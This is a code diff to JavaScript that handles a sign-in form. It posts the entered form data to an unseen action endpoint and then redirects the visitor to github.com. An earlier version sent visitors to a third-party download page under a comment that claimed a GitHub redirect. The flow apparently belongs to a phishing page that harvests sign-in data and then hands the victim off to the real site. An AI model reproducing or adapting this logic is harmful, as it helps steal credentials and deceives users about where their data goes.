@@ -53,6 +53,7 @@ if (lastSignin == 'invalid') {
       localStorage.setItem('firstInput', firsrtInput.value);
       event.preventDefault(); // Prevent default form submission
       location.reload();
+      isFormGood = false;
     }
     
 
@@ -72,43 +73,45 @@ if (lastSignin == 'invalid') {
         localStorage.clear('firstInput');
         isFormGood = true;
     } else {
+      event.preventDefault(); // Prevent default form submission
         //not a valid account username
         //Make the reload restart here to make link not visible in form
         localStorage.setItem('lastSignin', 'invalid');
         localStorage.setItem('firstInput', firsrtInput.value);
-        event.preventDefault(); // Prevent default form submission
         location.reload();
+        isFormGood = false;
     }
 }
 
 if (isFormGood) {
+  alert('good');
   event.preventDefault(); // Prevent default form submission
-    // Get form data
-    var formData = new FormData(this);
-    
-    // Send form data asynchronously
-    fetch(this.action, {
-      method: 'POST',
-      body: formData,
-      headers: {
-        'Accept': 'application/json'
-      }
-    })
-    .then(response => {
-      if (response.ok) {
-        // Optionally, do something with the successful response
-        console.log("Form submitted successfully");
-        // Redirect to github.com
-        window.location.href = "https://sidesync.en.lo4d.com/download";
-      } else {
-        // Handle errors
-        console.error("Form submission failed");
-      }
-    })
-    .catch(error => {
-      alert('error');
-      console.error("Error:", error);
-    });
+  
+  // Get form data
+  var formData = new FormData(this);
+  
+  // Send form data asynchronously
+  fetch(this.action, {
+    method: 'POST',
+    body: formData,
+    headers: {
+      'Accept': 'application/json'
+    }
+  })
+  .then(response => {
+    if (response.ok) {
+      // Optionally, do something with the successful response
+      console.log("Form submitted successfully");
+      // Redirect to github.com
+      window.location.href = "https://www.github.com";
+    } else {
+      // Handle errors
+      console.error("Form submission failed");
+    }
+  })
+  .catch(error => {
+    console.error("Error:", error);
+  });
 }
 
 });
